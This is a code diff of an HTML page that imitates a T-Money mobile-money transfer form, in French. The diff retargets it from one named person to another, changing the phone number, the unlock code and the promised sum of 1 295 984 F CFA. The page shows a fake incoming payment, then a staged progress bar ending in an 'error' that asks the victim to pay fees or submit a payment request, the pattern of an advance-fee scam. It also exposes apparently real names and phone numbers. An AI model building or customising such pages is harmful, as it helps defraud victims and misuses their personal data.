@@ -155,17 +155,17 @@
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
-                <input type="text" id="name" value="Kpidi Elome " disabled>
+                <input type="text" id="name" value="Ines Laghavare " disabled>
             </div>
 
             <div class="form-group">
                 <label for="phone">Numéro</label>
-                <input type="tel" id="phone" value="+241076388780" disabled>
+                <input type="tel" id="phone" value="+22655498159" disabled>
             </div>
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="390 000 F CFA " disabled>
+                <input type="text" id="amount" class="amount" value="1 295 984 F CFA " disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -177,7 +177,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Veuillez payer les frais de confirmation afin de terminer la transaction.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Veuillez remplir la demande de paiement afin de terminer la transaction.</div>
         </form>
     </div>
 
@@ -186,7 +186,7 @@
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
-            if (accessCode === "8780") {
+            if (accessCode === "8159") {
                 accessError.style.display = 'none';
                 document.getElementById('accessContainer').style.display = 'none';
                 document.getElementById('formContainer').style.display = 'block';
